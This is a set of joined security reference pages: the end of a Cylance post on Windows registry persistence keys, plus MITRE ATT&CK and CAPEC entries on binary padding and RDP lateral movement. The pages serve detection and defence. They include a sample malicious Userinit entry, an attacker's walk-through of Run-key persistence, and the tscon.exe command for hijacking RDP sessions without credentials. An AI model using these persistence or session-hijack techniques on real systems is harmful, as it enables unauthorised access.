outliers \xe2\x80\x93 those systems where only one or a few machines have drivers running from odd locations. By using the power of collective comparison, the anomalous registry settings can be quickly identified because they don't occur with high frequency like the normal settings do and therefore stand out. Even if a company deploys in-house developed code, we can determine that is the case by looking at the frequency of occurrence. In this way we are able to discover rootkits (because a rootkit hides itself by lying to the OS during DIR and TASKLIST commands but not from REG QUERY) and other tools configured to load as system drivers very early in the boot sequence. We then gather additional data in order to get a more complete picture of the purpose for these drivers. Run Services Keys (4 through 7) These keys are referenced both early in the boot process to identify driver files (typically *.sys) that are to be loaded and later by the service controller (SC.EXE) when starting those services that are configured as services (daemons). I will discuss the use of these keys in more depth below. Winlogon Keys (8 through 11) Winlogon.exe is another user-mode executable that is loaded very early during startup by wininit.exe and handles interactive user logons and logoffs. This process handles the Secure Attention Sequence (SAS) known to us all as Ctrl-Alt-Delete which is designed to protect against password-capture user-mode applications since the SAS can only be processed by the kernel, which notifies winlogon.exe. Winlogon\\notify The notify subkeys are used to configure event handlers that are to be notified whenever certain events happen, related to SAS. Events are things like logon, logoff, shutdown, lock, etc. This can be used maliciously to launch a DLL whenever the event occurs. serinit The Userinit string array (REG_SZ) contains by default just\xc2 serinit.exe\xc2 but can have other entries as well and should be monitored. Administrator-level rights are needed to modify this key. An example of how this could be used to launch malicious code. The second entry is part of a password stealing Trojan. serinit.exe,C:\\WINDOWS\\system32\\sovhst.exe Winlogon\\Shell This should be set to ""explorer.exe"" since that is the Windows interface we all know and use. The value should be just the name, spelled correctly. Since no path is given, the process launches from the windows storage location, the \\Windows directory. There should not be a path listed, just the name. There is a configuration for this in the machine hive and the user hive (HKLM and HKCU) and another entry determines which is to be used. Check\xc2 HKLM\\ \\Software\\Microsoft\\Windows NT\\CurrentVersion\\IniFileMapping\\system.ini\\boot\\Shell. The value by default is pointing to the machine hive value\xc2 SYS:Microsoft\\Windows NT\\CurrentVersion\\Winlogon\xc2 and the user hive value isn't used. ShellServiceObjectDelayLoad (12) This key is undocumented and there it cannot be said with certainty the support and behavior of the use of this key since it could change at any time. On my Windows 7 Ultimate laptop, this key has a single subkey called ""WebCheck"" and a GUID of {E6FB5E20-DE35-11CF-9C87-00AA005127ED} but there is no dll configured under the CLSID key. Run Keys (13 through 19) The run keys have been the method typically used by run-of-the-mill viruses and worms and not tools used in targeted attacks. Because the attack team is located some distance away on the internet, they need to ensure that their code will launch again if the computer they compromise gets rebooted. The run keys are the easiest way to do this and offer different levels of privilege depending on their exploit and what level it achieves for them. If their exploit fails to obtain NT AUTHORITY\\SYSTEM or administrator-level rights they can always create a key under the ""user"" run keys and persist their access. From there they can work on elevating privilege levels and move to create less obvious persistence hooks and then clean up the run keys because they are heavily scrutinized and monitored by all sorts of host-based controls. Attackers are also concerned about taking risks and moving from run keys as soon as possible is one way of lowering their risk profile. However, with the proliferation of botnet and noisy commodity malware providing cover (like chaff on a RADAR screen), the use of these keys can be tolerated in some environments for some time (perhaps permanently) and provides the following objectives: Obtain and maintain some level of remote access Reconnaissance from a single machine (What rights does this user have? What other accounts are on this machine? What software is installed that I have the ability to exploit?) Work to elevate to a machine service and remove the run keys Continue reconnaissance and look to move laterally with the goal of getting: Windows Domain Controller access; locate network file shares and who has access to them; obtain specialty credentials (database, code repositories, web application logins, etc.); obtain the ability to utilize the same remote-access infrastructure that is provided to employees. If, as the attacker, my phish is launched by Norman on his laptop and his account, nsmith, is not in the Administrators local group, then I have to persist by using the HKCU run key or adding my tool toC:\\Users\\nsmith\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startupdirectory because this is the only place nsmith has rights to create entries. After doing this I will inventory installed and running software in order to find some software that I can exploit (assuming Windows 7+ as the OS). Detecting recent activity in the HKCU run keys is indicative of Stage 1 dropper/downloaders or Stage 2 efforts to harvest other access points inside the enterprise. Close inspection of the targeted computer for signs of activity can yield a wealth of information that then leads you down the path of your investigation and removing the attacker's access to your computers and intellectual property. Persistence Location Privilege Level HKCU run keys useraccount: FC HKLM run keys Users:R, Administrators: FC Legacy Windows Load (20 and 21) When Microsoft transitioned from 3.x to NT, they added this key to replace the win.ini file load= and run= values. On Windows 7 this key doesn't exist by default under either the ""machine"" (HKLM) or the ""user"" (HKCU) hives but if present can be used to launch programs during startup. The ""machine"" key launches at computer startup and the ""user"" key runs at user login. AppInit_DLLs (23) Even though I'm listing this as number 23, every time User32.dll is linked (loaded by an executable), this registry string array is read and any modules listed are also loaded by the executable. This happens at various times while windows is starting up so I can't really place it where it first occurs. As you can guess, this is a great way to hoist code into a great number of running processes. It is worth keeping an eye on this registry location as well. AppInit gets its own tab in Autoruns, but you can script the following to read just the string array from your systems: reg query ""HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows"" /v appinit_dlls Active Registry It's worth mentioning that CurrentControlSet is just a symbolic link to indicate the hive that is active, meaning it is in-use by the running OS. Almost all the time this will be ControlSet001, but you can see which is active by looking at the ""Current"" value under\xc2 HKLM\\System\\Select. The number indicates which ControlSet is loaded, where the number corresponds to the two ControlSets. It is always good to also pay attention to the ""previously run"" version of the registry, which is usually ControlSet002, since transient entries could still be present there. For example, if a dropper set itself to run at startup, then once a different persistence is achieved, it removes itself, that old persistence entry could still be present in the LastKnownGood registry. Next Time There are of course other methods of persistence with certain file and file system locations being the major ones. I'll cover those in part 3. Until then, keep 'er safe! \xc2 Share It: Threat Research About The Author Scott Langendorf Scott Langendorf is a previous\xc2 contributor for Cylance\xc2\xae,\xc2 who are revolutionizing cybersecurity with products and services that proactively prevent,\xc2 rather than reactively detect the execution of advanced persistent threats and malware. Our technology is deployed on over ten million endpoints and protects hundreds of enterprise clients worldwide including Fortune 100 organizations and government institutions. Author's Bio Get the ThreatVector Newsletter 400 Spectrum Center Dr., Suite #900 Irvine, CA 92618 1-844-CYLANCE 1-844-295-2623 \xc2\xa92019 Cylance Inc. All Rights Reserved. Blog Home News Bites Videos Resources Cylance News Webcasts Podcasts Contributors Company Who We Are Resource Center Cylance News Press Releases Privacy Notice Terms of Service Products CylancePROTECT CylanceOPTICS Cylance ThreatZERO Cylance Smart Antivirus Services Consulting Overview Industry Overview
"Binary Padding - Enterprise | MITRE ATT&CK\xe2\x84\xa2 Matrices Tactics PRE-ATT&CK Enterprise Mobile Techniques PRE-ATT&CK Enterprise Mobile Mitigations Enterprise Mobile Groups Software Resources General Information Getting Started ATT&CKcon Working with ATT&CK FAQ Updates Previous Versions Related Projects Blog\xc2 Contribute Register to stream ATT&CKcon 2.0 October 29-30 ENTERPRISE ENTERPRISE MOBILE PRE-ATT&CK TECHNIQUES All Initial Access Drive-by Compromise Exploit Public-Facing Application External Remote Services Hardware Additions Replication Through Removable Media Spearphishing Attachment Spearphishing Link Spearphishing via Service Supply Chain Compromise Trusted Relationship Valid Accounts Execution AppleScript CMSTP Command-Line Interface Compiled HTML File Control Panel Items Dynamic Data Exchange Execution through API Execution through Module Load Exploitation for Client Execution Graphical User Interface InstallUtil Launchctl Local Job Scheduling LSASS Driver Mshta PowerShell Regsvcs/Regasm Regsvr32 Rundll32 Scheduled Task Scripting Service Execution Signed Binary Proxy Execution Signed Script Proxy Execution Source Space after Filename Third-party Software Trap Trusted Developer Utilities User Execution Windows Management Instrumentation Windows Remote Management XSL Script Processing Persistence .bash_profile and .bashrc Accessibility Features Account Manipulation AppCert DLLs AppInit DLLs Application Shimming Authentication Package BITS Jobs Bootkit Browser Extensions Change Default File Association Component Firmware Component Object Model Hijacking Create Account DLL Search Order Hijacking Dylib Hijacking External Remote Services File System Permissions Weakness Hidden Files and Directories Hooking Hypervisor Image File Execution Options Injection Kernel Modules and Extensions Launch Agent Launch Daemon Launchctl LC_LOAD_DYLIB Addition Local Job Scheduling Login Item Logon Scripts LSASS Driver Modify Existing Service Netsh Helper DLL New Service Office Application Startup Path Interception Plist Modification Port Knocking Port Monitors Rc.common Re-opened Applications Redundant Access Registry Run Keys / Startup Folder Scheduled Task Screensaver Security Support Provider Service Registry Permissions Weakness Setuid and Setgid Shortcut Modification SIP and Trust Provider Hijacking Startup Items System Firmware Systemd Service Time Providers Trap Valid Accounts Web Shell Windows Management Instrumentation Event Subscription Winlogon Helper DLL Privilege Escalation Access Token Manipulation Accessibility Features AppCert DLLs AppInit DLLs Application Shimming Bypass User Account Control DLL Search Order Hijacking Dylib Hijacking Exploitation for Privilege Escalation Extra Window Memory Injection File System Permissions Weakness Hooking Image File Execution Options Injection Launch Daemon New Service Path Interception Plist Modification Port Monitors Process Injection Scheduled Task Service Registry Permissions Weakness Setuid and Setgid SID-History Injection Startup Items Sudo Sudo Caching Valid Accounts Web Shell Defense Evasion Access Token Manipulation Binary Padding BITS Jobs Bypass User Account Control Clear Command History CMSTP Code Signing Compile After Delivery Compiled HTML File Component Firmware Component Object Model Hijacking Control Panel Items DCShadow Deobfuscate/Decode Files or Information Disabling Security Tools DLL Search Order Hijacking DLL Side-Loading Execution Guardrails Exploitation for Defense Evasion Extra Window Memory Injection File Deletion File Permissions Modification File System Logical Offsets Gatekeeper Bypass Group Policy Modification Hidden Files and Directories Hidden Users Hidden Window HISTCONTROL Image File Execution Options Injection Indicator Blocking Indicator Removal from Tools Indicator Removal on Host Indirect Command Execution Install Root Certificate InstallUtil Launchctl LC_MAIN Hijacking Masquerading Modify Registry Mshta Network Share Connection Removal NTFS File Attributes Obfuscated Files or Information Plist Modification Port Knocking Process Doppelg\xc3\xa4nging Process Hollowing Process Injection Redundant Access Regsvcs/Regasm Regsvr32 Rootkit Rundll32 Scripting Signed Binary Proxy Execution Signed Script Proxy Execution SIP and Trust Provider Hijacking Software Packing Space after Filename Template Injection Timestomp Trusted Developer Utilities Valid Accounts Virtualization/Sandbox Evasion Web Service XSL Script Processing Credential Access Account Manipulation Bash History Brute Force Credential Dumping Credentials in Files Credentials in Registry Exploitation for Credential Access Forced Authentication Hooking Input Capture Input Prompt Kerberoasting Keychain LLMNR/NBT-NS Poisoning and Relay Network Sniffing Password Filter DLL Private Keys Securityd Memory Two-Factor Authentication Interception Discovery Account Discovery Application Window Discovery Browser Bookmark Discovery Domain Trust Discovery File and Directory Discovery Network Service Scanning Network Share Discovery Network Sniffing Password Policy Discovery Peripheral Device Discovery Permission Groups Discovery Process Discovery Query Registry Remote System Discovery Security Software Discovery System Information Discovery System Network Configuration Discovery System Network Connections Discovery System Owner/User Discovery System Service Discovery System Time Discovery Virtualization/Sandbox Evasion Lateral Movement AppleScript Application Deployment Software Distributed Component Object Model Exploitation of Remote Services Logon Scripts Pass the Hash Pass the Ticket Remote Desktop Protocol Remote File Copy Remote Services Replication Through Removable Media Shared Webroot SSH Hijacking Taint Shared Content Third-party Software Windows Admin Shares Windows Remote Management Collection Audio Capture Automated Collection Clipboard Data Data from Information Repositories Data from Local System Data from Network Shared Drive Data from Removable Media Data Staged Email Collection Input Capture Man in the Browser Screen Capture Video Capture Command and Control Commonly Used Port Communication Through Removable Media Connection Proxy Custom Command and Control Protocol Custom Cryptographic Protocol Data Encoding Data Obfuscation Domain Fronting Domain Generation Algorithms Fallback Channels Multi-hop Proxy Multi-Stage Channels Multiband Communication Multilayer Encryption Port Knocking Remote Access Tools Remote File Copy Standard Application Layer Protocol Standard Cryptographic Protocol Standard Non-Application Layer Protocol Uncommonly Used Port Web Service Exfiltration Automated Exfiltration Data Compressed Data Encrypted Data Transfer Size Limits Exfiltration Over Alternative Protocol Exfiltration Over Command and Control Channel Exfiltration Over Other Network Medium Exfiltration Over Physical Medium Scheduled Transfer Impact Data Destruction Data Encrypted for Impact Defacement Disk Content Wipe Disk Structure Wipe Endpoint Denial of Service Firmware Corruption Inhibit System Recovery Network Denial of Service Resource Hijacking Runtime Data Manipulation Service Stop Stored Data Manipulation Transmitted Data Manipulation Home Techniques Enterprise Binary Padding Binary Padding Some security tools inspect files with static signatures to determine if they are known malicious. Adversaries may add data to files to increase the size beyond what security tools are capable of handling or to change the file hash to avoid hash-based blacklists. ID:\xc2 T1009 Tactic: Defense Evasion Platform:\xc2 Linux, macOS, Windows Data Sources:\xc2 Binary file metadata, File monitoring, Malware reverse engineering Defense Bypassed:\xc2 Signature-based detection, Anti-virus CAPEC ID: CAPEC-572 Version:\xc2 1.0 Mitigations This type of attack technique cannot be easily mitigated with preventive controls since it is based on the abuse of system features. Examples Name Description APT32 APT32 includes garbage code to mislead anti-malware software and researchers. [11] [12] BRONZE BUTLER BRONZE BUTLER downloader code has included ""0"" characters at the end of the file to inflate the file size in a likely attempt to evade anti-virus detection. [16] Comnie Comnie appends a total of 64MB of garbage data to a file to deter any security products in place that may be scanning files on disk. [8] CORESHELL CORESHELL contains unused machine instructions in a likely attempt to hinder analysis. [7] Emissary A variant of Emissary appends junk data to the end of its DLL file to create a large file that may exceed the maximum size that anti-virus programs can scan. [2] FinFisher FinFisher contains junk code in its functions in an effort to confuse disassembly programs. [5] [6] Kwampirs Before writing to disk, Kwampirs inserts a randomly generated string into the middle of the decrypted payload in an attempt to evade hash-based detections. [3] Leviathan Leviathan has inserted garbage characters into code, presumably to avoid anti-virus detection. [15] Moafee Moafee has been known to employ binary padding. [14] Patchwork Patchwork apparently altered NDiskMonitor samples by adding four bytes of random letters in a likely attempt to change the file hashes. [13] SamSam SamSam has used garbage code to pad some of its malware components. [10] XTunnel A version of XTunnel introduced in July 2015 inserted junk code into the binary in a likely attempt to obfuscate it and bypass security products. [4] yty yty contains junk code in its binary, likely to confuse malware analysts. [1] ZeroT ZeroT has obfuscated DLLs and functions using dummy API calls inserted between real instructions. [9] Detection Depending on the method used to pad files, a file-based signature may be capable of detecting padding using a scanning or on-access based tool. When executed, the resulting process from padded files may also exhibit other behavior characteristics of being used to conduct an intrusion such as system and network information Discovery or Lateral Movement, which could be used as event indicators that point to the source file. References Schwarz, D., Sopko J. (2018, March 08). Donot Team Leverages New Modular Malware Framework in South Asia. Retrieved June 11, 2018. Falcone, R. and Miller-Osborn, J.. (2016, February 3). Emissary Trojan Changelog: Did Operation Lotus Blossom Cause It to Evolve?. Retrieved February 15, 2016. Symantec Security Response Attack Investigation Team. (2018, April 23). New Orangeworm attack group targets the healthcare sector in the U.S., Europe, and Asia. Retrieved May 8, 2018. ESET. (2016, October). En Route with Sednit - Part 2: Observing the Comings and Goings. Retrieved November 21, 2016. FinFisher. (n.d.). Retrieved December 20, 2017. Allievi, A.,Flori, E. (2018, March 01). FinFisher exposed: A researcher\xe2\x80\x99s tale of defeating traps, tricks, and complex virtual machines. Retrieved July 9, 2018. FireEye. (2015). APT28: A WINDOW INTO RUSSIA\xe2\x80\x99S CYBER ESPIONAGE OPERATIONS?. Retrieved August 19, 2015. Grunzweig, J. (2018, January 31). Comnie Continues to Target Organizations in East Asia. Retrieved June 7, 2018. Huss, D., et al. (2017, February 2). Oops, they did it again: APT Targets Russia and Belarus with ZeroT and PlugX. Retrieved April 5, 2018. Palotay, D. and Mackenzie, P. (2018, April). SamSam Ransomware Chooses Its Targets Carefully. Retrieved April 15, 2019. Folt\xc3\xbdn, T. (2018, March 13). OceanLotus ships new backdoor using old tricks. Retrieved May 22, 2018. Dumont, R. (2019, March 20). Fake or Fake: Keeping up with OceanLotus decoys. Retrieved April 1, 2019. Lunghi, D., et al. (2017, December). Untangling the Patchwork Cyberespionage Group. Retrieved July 10, 2018. Haq, T., Moran, N., Scott, M., & Vashisht, S. O. (2014, September 10). The Path to Mass-Producing Cyber Attacks [Blog]. Retrieved November 12, 2014. Axel F, Pierre T. (2017, October 16). Leviathan: Espionage actor spearphishes maritime and defense targets. Retrieved February 15, 2018. Counter Threat Unit Research Team. (2017, October 12). BRONZE BUTLER Targets Japanese Enterprises. Retrieved January 4, 2018. Copyright \xc2\xa9 2015-2019, The MITRE Corporation. MITRE ATT&CK and ATT&CK are trademarks of The MITRE Corporation. Privacy Policy Terms of Use @MITREattack Contact
"CAPEC - CAPEC-572: Artificially Inflate File Sizes (Version 3.1) Common Attack Pattern Enumeration and Classification A Community Resource for Identifying and Understanding Attacks Home > CAPEC List > CAPEC-572: Artificially Inflate File Sizes (Version 3.1) \xc2 ID Lookup: Home About Overview Documents Use Cases Resources Glossary FAQs CAPEC List Latest Version Downloads Reports Archive Community Community Citations Vendor Usage Discussion List Related Activities News Current News Free Newsletter CAPEC on Twitter CAPEC on News Archive Search CAPEC-572: Artificially Inflate File Sizes Attack Pattern ID: 572 Abstraction: Detailed Status: Draft Presentation Filter: Basic Complete Description Security tools often inspect executables to determine if they are malicious. Adversaries may add data to executables to increase the executable size beyond what security tools are capable of handling. Adding data to an executable also changes the file's hash, frustrating security tools that look for known bad files by their hash. Relationships The table(s) below shows the other attack patterns and high level categories that are related to this attack pattern. These relationships are defined as ChildOf, ParentOf, MemberOf and give insight to similar items that may exist at higher and lower levels of abstraction. In addition, relationships such as CanFollow, PeerOf, and CanAlsoBe are defined to show similar attack patterns that the user may want to explore. Nature Type ID Name ChildOf Meta Attack Pattern - A meta level attack pattern in CAPEC is a decidedly abstract characterization of a specific methodology or technique used in an attack. A meta attack pattern is often void of a specific technology or implementation and is meant to provide an understanding of a high level approach. A meta level attack pattern is a generalization of related group of standard level attack patterns. Meta level attack patterns are particularly useful for architecture and design level threat modeling exercises. 148 Content Spoofing Taxonomy Mappings Relevant to the ATT&CK taxonomy mapping Entry ID Entry Name 1009 Binary padding Content History Submissions Submission Date Submitter Organization 2015-11-09 CAPEC Content Team The MITRE Corporation Modifications Modification Date Modifier Organization 2019-04-04 CAPEC Content Team The MITRE Corporation Updated Related_Attack_Patterns More information is available \xe2\x80\x94 Please select a different filter. Page Last Updated or Reviewed: July 31, 2018 \xc2 Use of the Common Attack Pattern Enumeration and Classification dictionary and classification taxonomy, and the associated references from this website, are subject to the Terms of Use. For more information, please email capec@mitre.org. CAPEC is sponsored by the U.S. Department of Homeland Security (DHS) Cybersecurity and Infrastructure Security Agency (CISA). Copyright \xc2\xa9 2007 - 2019, The MITRE Corporation. CAPEC and the CAPEC logo are trademarks of The MITRE Corporation. Privacy policy Terms of use Site Map Contact us \xc2
"Remote Desktop Protocol - Enterprise | MITRE ATT&CK\xe2\x84\xa2 Matrices Tactics PRE-ATT&CK Enterprise Mobile Techniques PRE-ATT&CK Enterprise Mobile Mitigations Enterprise Mobile Groups Software Resources General Information Getting Started ATT&CKcon Working with ATT&CK FAQ Updates Previous Versions Related Projects Blog\xc2 Contribute Register to stream ATT&CKcon 2.0 October 29-30 ENTERPRISE ENTERPRISE MOBILE PRE-ATT&CK TECHNIQUES All Initial Access Drive-by Compromise Exploit Public-Facing Application External Remote Services Hardware Additions Replication Through Removable Media Spearphishing Attachment Spearphishing Link Spearphishing via Service Supply Chain Compromise Trusted Relationship Valid Accounts Execution AppleScript CMSTP Command-Line Interface Compiled HTML File Control Panel Items Dynamic Data Exchange Execution through API Execution through Module Load Exploitation for Client Execution Graphical User Interface InstallUtil Launchctl Local Job Scheduling LSASS Driver Mshta PowerShell Regsvcs/Regasm Regsvr32 Rundll32 Scheduled Task Scripting Service Execution Signed Binary Proxy Execution Signed Script Proxy Execution Source Space after Filename Third-party Software Trap Trusted Developer Utilities User Execution Windows Management Instrumentation Windows Remote Management XSL Script Processing Persistence .bash_profile and .bashrc Accessibility Features Account Manipulation AppCert DLLs AppInit DLLs Application Shimming Authentication Package BITS Jobs Bootkit Browser Extensions Change Default File Association Component Firmware Component Object Model Hijacking Create Account DLL Search Order Hijacking Dylib Hijacking External Remote Services File System Permissions Weakness Hidden Files and Directories Hooking Hypervisor Image File Execution Options Injection Kernel Modules and Extensions Launch Agent Launch Daemon Launchctl LC_LOAD_DYLIB Addition Local Job Scheduling Login Item Logon Scripts LSASS Driver Modify Existing Service Netsh Helper DLL New Service Office Application Startup Path Interception Plist Modification Port Knocking Port Monitors Rc.common Re-opened Applications Redundant Access Registry Run Keys / Startup Folder Scheduled Task Screensaver Security Support Provider Service Registry Permissions Weakness Setuid and Setgid Shortcut Modification SIP and Trust Provider Hijacking Startup Items System Firmware Systemd Service Time Providers Trap Valid Accounts Web Shell Windows Management Instrumentation Event Subscription Winlogon Helper DLL Privilege Escalation Access Token Manipulation Accessibility Features AppCert DLLs AppInit DLLs Application Shimming Bypass User Account Control DLL Search Order Hijacking Dylib Hijacking Exploitation for Privilege Escalation Extra Window Memory Injection File System Permissions Weakness Hooking Image File Execution Options Injection Launch Daemon New Service Path Interception Plist Modification Port Monitors Process Injection Scheduled Task Service Registry Permissions Weakness Setuid and Setgid SID-History Injection Startup Items Sudo Sudo Caching Valid Accounts Web Shell Defense Evasion Access Token Manipulation Binary Padding BITS Jobs Bypass User Account Control Clear Command History CMSTP Code Signing Compile After Delivery Compiled HTML File Component Firmware Component Object Model Hijacking Control Panel Items DCShadow Deobfuscate/Decode Files or Information Disabling Security Tools DLL Search Order Hijacking DLL Side-Loading Execution Guardrails Exploitation for Defense Evasion Extra Window Memory Injection File Deletion File Permissions Modification File System Logical Offsets Gatekeeper Bypass Group Policy Modification Hidden Files and Directories Hidden Users Hidden Window HISTCONTROL Image File Execution Options Injection Indicator Blocking Indicator Removal from Tools Indicator Removal on Host Indirect Command Execution Install Root Certificate InstallUtil Launchctl LC_MAIN Hijacking Masquerading Modify Registry Mshta Network Share Connection Removal NTFS File Attributes Obfuscated Files or Information Plist Modification Port Knocking Process Doppelg\xc3\xa4nging Process Hollowing Process Injection Redundant Access Regsvcs/Regasm Regsvr32 Rootkit Rundll32 Scripting Signed Binary Proxy Execution Signed Script Proxy Execution SIP and Trust Provider Hijacking Software Packing Space after Filename Template Injection Timestomp Trusted Developer Utilities Valid Accounts Virtualization/Sandbox Evasion Web Service XSL Script Processing Credential Access Account Manipulation Bash History Brute Force Credential Dumping Credentials in Files Credentials in Registry Exploitation for Credential Access Forced Authentication Hooking Input Capture Input Prompt Kerberoasting Keychain LLMNR/NBT-NS Poisoning and Relay Network Sniffing Password Filter DLL Private Keys Securityd Memory Two-Factor Authentication Interception Discovery Account Discovery Application Window Discovery Browser Bookmark Discovery Domain Trust Discovery File and Directory Discovery Network Service Scanning Network Share Discovery Network Sniffing Password Policy Discovery Peripheral Device Discovery Permission Groups Discovery Process Discovery Query Registry Remote System Discovery Security Software Discovery System Information Discovery System Network Configuration Discovery System Network Connections Discovery System Owner/User Discovery System Service Discovery System Time Discovery Virtualization/Sandbox Evasion Lateral Movement AppleScript Application Deployment Software Distributed Component Object Model Exploitation of Remote Services Logon Scripts Pass the Hash Pass the Ticket Remote Desktop Protocol Remote File Copy Remote Services Replication Through Removable Media Shared Webroot SSH Hijacking Taint Shared Content Third-party Software Windows Admin Shares Windows Remote Management Collection Audio Capture Automated Collection Clipboard Data Data from Information Repositories Data from Local System Data from Network Shared Drive Data from Removable Media Data Staged Email Collection Input Capture Man in the Browser Screen Capture Video Capture Command and Control Commonly Used Port Communication Through Removable Media Connection Proxy Custom Command and Control Protocol Custom Cryptographic Protocol Data Encoding Data Obfuscation Domain Fronting Domain Generation Algorithms Fallback Channels Multi-hop Proxy Multi-Stage Channels Multiband Communication Multilayer Encryption Port Knocking Remote Access Tools Remote File Copy Standard Application Layer Protocol Standard Cryptographic Protocol Standard Non-Application Layer Protocol Uncommonly Used Port Web Service Exfiltration Automated Exfiltration Data Compressed Data Encrypted Data Transfer Size Limits Exfiltration Over Alternative Protocol Exfiltration Over Command and Control Channel Exfiltration Over Other Network Medium Exfiltration Over Physical Medium Scheduled Transfer Impact Data Destruction Data Encrypted for Impact Defacement Disk Content Wipe Disk Structure Wipe Endpoint Denial of Service Firmware Corruption Inhibit System Recovery Network Denial of Service Resource Hijacking Runtime Data Manipulation Service Stop Stored Data Manipulation Transmitted Data Manipulation Home Techniques Enterprise Remote Desktop Protocol Remote Desktop Protocol Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS). [1] There are other implementations and third-party tools that provide graphical access Remote Services similar to RDS. Adversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials. Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP. Adversaries may also use RDP in conjunction with the Accessibility Features technique for Persistence. [2] Adversaries may also perform RDP session hijacking which involves stealing a legitimate user's remote session. Typically, a user is notified when someone else is trying to steal their session and prompted with a question. With System permissions and using Terminal Services Console, c:\\windows\\system32\\tscon.exe [session number to be stolen], an adversary can hijack a session without the need for credentials or prompts to the user. [3] This can be done remotely or locally and with active or disconnected sessions. [4] It can also lead to Remote System Discovery and Privilege Escalation by stealing a Domain Admin or higher privileged account session. All of this can be done by using native Windows commands, but it has also been added as a feature in RedSnarf. [5] ID:\xc2 T1076 Tactic: Lateral Movement Platform:\xc2 Windows System Requirements:\xc2 RDP service enabled, account in the Remote Desktop Users group. Permissions Required:\xc2 Remote Desktop Users, User Data Sources:\xc2 Authentication logs, Netflow/Enclave netflow, Process monitoring CAPEC ID: CAPEC-555 Contributors:\xc2 Matthew Demaske, Adaptforward Version:\xc2 1.0 Mitigations Mitigation Description Audit Audit the Remote Desktop Users group membership regularly. Remove unnecessary accounts and groups from Remote Desktop Users groups Disable or Remove Feature or Program Disable the RDP service if it is unnecessary. Limit Access to Resource Over Network Use remote desktop gateways. Multi-factor Authentication Use multi-factor authentication for remote logins. [7] Network Segmentation Do not leave RDP accessible from the internet. Enable firewall rules to block RDP traffic between network security zones within a network. Operating System Configuration Change GPOs to define shorter timeouts sessions and maximum amount of time any single session can be active. Change GPOs to specify the maximum amount of time that a disconnected session stays active on the RD session host server. [6] Privileged Account Management Consider removing the local Administrators group from the list of groups allowed to log in through RDP. User Account Management Limit remote user permissions if remote access is necessary. Examples Name Description APT1 The APT1 group is known to have used RDP during operations. [23] APT3 APT3 enables the Remote Desktop Protocol for persistence. [22] APT39 APT39 has been seen using RDP for lateral movement and persistence. [39] Axiom The Axiom group is known to have used RDP during operations. [37] Carbanak Carbanak enables concurrent Remote Desktop Protocol (RDP). [15] Cobalt Group Cobalt Group has used Remote Desktop Protocol to conduct lateral movement. [21] Cobalt Strike Cobalt Strike can start a VNC-based remote desktop server and tunnel the connection through the already established C2 channel. [12] DarkComet DarkComet can open an active screen of the victim\xe2\x80\x99s machine and take control of the mouse and keyboard. [14] Dragonfly 2.0 Dragonfly 2.0 moved laterally via RDP. [33] [34] FIN10 FIN10 has used RDP to move laterally to systems in the victim environment. [35] FIN6 FIN6 used RDP to move laterally in victim networks. [24] [25] FIN8 FIN8 has used RDP for. [30] jRAT jRAT can support RDP control. [17] Koadic Koadic can enable remote desktop on the victim's machine. [10] Lazarus Group Lazarus Group malware SierraCharlie uses RDP for propagation. [26] [27] Leviathan Leviathan has targeted RDP credentials and used it to move through the victim environment. [40] menuPass menuPass has used RDP connections to move across the victim network. [31] [32] njRAT njRAT has a module for performing remote desktop access. [20] OilRig OilRig has used Remote Desktop Protocol for lateral movement. The group has also used tunneling tools to tunnel RDP into the environment. [28] [29] Patchwork Patchwork attempted to use RDP to move laterally. [36] Pupy Pupy can enable/disable RDP connection and can start a remote desktop session using a browser web socket client. [11] QuasarRAT QuasarRAT has a module for performing remote desktop access. [8] [9] Revenge RAT Revenge RAT has a plugin to perform RDP access. [18] ServHelper ServHelper has commands for adding a remote desktop user and sending RDP traffic to the attacker through a reverse SSH tunnel. [19] Stolen Pencil Stolen Pencil utilized RDP for direct remote point-and-click access. [38] TEMP.Veles TEMP.Veles utilized RDP throughout an operation. [41] WannaCry WannaCry enumerates current remote desktop sessions and tries to execute the malware on each session. [16] zwShell zwShell has used RDP for lateral movement. [13] Detection Use of RDP may be legitimate, depending on the network environment and how it is used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior with RDP. Monitor for user accounts logged into systems they would not normally access or access patterns to multiple systems over a relatively short period of time. Also, set up process monitoring for tscon.exe usage and monitor service creation that uses cmd.exe /k or cmd.exe /c in its arguments to prevent RDP session hijacking. References Microsoft. (n.d.). Remote Desktop Services. Retrieved June 1, 2016. Alperovitch, D. (2014, October 31). Malware-Free Intrusions. Retrieved November 4, 2014. Korznikov, A. (2017, March 17). Passwordless RDP Session Hijacking Feature All Windows versions. Retrieved December 11, 2017. Beaumont, K. (2017, March 19). RDP hijacking\xe2\x80\x8a\xe2\x80\x94\xe2\x80\x8ahow to hijack RDS and RemoteApp sessions transparently to move through an organisation. Retrieved December 11, 2017. NCC Group PLC. (2016, November 1). Kali Redsnarf. Retrieved December 11, 2017. Microsoft. (n.d.). Configure Timeout and Reconnection Settings for Remote Desktop Services Sessions. Retrieved December 11, 2017. Berkeley Security, University of California. (n.d.). Securing Remote Desktop for System Administrators. Retrieved November 4, 2014. MaxXor. (n.d.). QuasarRAT. Retrieved July 10, 2018. Meltzer, M, et al. (2018, June 07). Patchwork APT Group Targets US Think Tanks. Retrieved July 16, 2018. Magius, J., et al. (2017, July 19). Koadic. Retrieved June 18, 2018. Nicolas Verdier. (n.d.). Retrieved January 29, 2018. Strategic Cyber LLC. (2017, March 14). Cobalt Strike Manual. Retrieved May 24, 2017. McAfee\xc2\xae Foundstone\xc2\xae Professional Services and McAfee Labs\xe2\x84\xa2. (2011, February 10). Global Energy Cyberattacks: \xe2\x80\x9cNight Dragon\xe2\x80\x9d. Retrieved February 19, 2018. Kujawa, A. (2018, March 27). You dirty RAT! Part 1: DarkComet. Retrieved November 6, 2018. Bennett, J., Vengerik, B. (2017, June 12). Behind the CARBANAK Backdoor. Retrieved June 11, 2018. Noerenberg, E., Costis, A., and Quist, N. (2017, May 16). A Technical Analysis of WannaCry Ransomware. Retrieved March 25, 2019. Kamluk, V. & Gostev, A. (2016, February). Adwind - A Cross-Platform RAT. Retrieved April 23, 2019. Livelli, K, et al. (2018, November 12). Operation Shaheen. Retrieved May 1, 2019. Schwarz, D. 